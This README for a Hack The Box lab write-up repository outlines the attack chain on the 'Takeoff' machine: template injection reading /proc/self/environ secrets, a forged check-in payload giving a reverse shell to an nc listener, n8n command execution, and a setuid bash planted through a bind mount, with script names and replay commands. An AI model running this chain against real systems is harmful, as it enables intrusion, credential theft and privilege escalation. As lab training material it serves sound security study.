# Takeoff (HTB, Linux / Release Arena)

Go/Echo **HTB Airways** booking app behind nginx. SSTI file-read in ticket notes, forged gob check-in for `www-data`, n8n as container-root, then a host bind-mount setuid.

- **[WRITEUP.md](WRITEUP.md)** — chain (no flags, no live passwords)
- **[scripts/](scripts/)** — book a flight, SSTI file read, gob+HMAC check-in, n8n `executeCommand`

| | |
|--|--|
| **OS** | Debian 13, OpenSSH 10, nginx + Echo |
| **Host** | `takeoff.htb` |
| **Entry** | 80 only (plus SSH). Register → book → ticket notes |
| **User** | n8n container root; `/root` is the host user home (bind-mount) |
| **Root** | container-root writes a setuid copy of the **host** `bash` into that mount |

No flags, VPN configs, or live passwords in this tree. Copy `secrets.example.env` → `secrets.env`.

## Attack chain (overview)

```text
Kali tun0
  └─ 80 nginx  Echo  takeoff.htb
        └─ Go text/template  {{.File PATH}}  in the boarding-pass PDF
              └─ process env  TICKET_VALIDATION_TOKEN + N8N_API_KEY
                    └─ gob *VerifyTicketAuthenticity + HMAC-SHA256
                          └─ NotifyCmd  →  www-data
                                └─ n8n :5678  executeCommand  (container root)
                                      └─ bind-mount /home/<user>  →  setuid host bash
```

## Scripts

| File | Where | What |
|------|-------|------|
| `scripts/01-book.py` | Kali | register, test card, book cheapest Coach, print PNR |
| `scripts/02-ssti-read.py` | Kali | `{{.File}}` via notes + PDF |
| `scripts/03-checkin-rce.py` | Kali | rewrite `NotifyCmd`, gob+HMAC, `POST /api/check-in` |
| `scripts/forge_checkin.go` | Kali | encoder (called by `03`) |
| `scripts/04-n8n-exec.py` | **target** (`www-data`) | webhook + `executeCommand` |
| `scripts/wf-flex.json` | target | n8n workflow body |
| `scripts/replay.sh` | Kali | wrapper |

```bash
cp secrets.example.env secrets.env   # TARGET, LHOST, EMAIL, …
echo '<TARGET_IP> takeoff.htb' | sudo tee -a /etc/hosts
export TARGET=<ip> LHOST=<tun0>
./scripts/replay.sh book
./scripts/replay.sh ssti /proc/self/environ
# terminal A:  nc -lvnp 4444
./scripts/replay.sh rce
# then on the reverse shell:
python3 scripts/04-n8n-exec.py --cmd 'id'
```

Needs: `python3`, `curl`, `pdftotext` (poppler), `go`. Educational / HTB lab only.
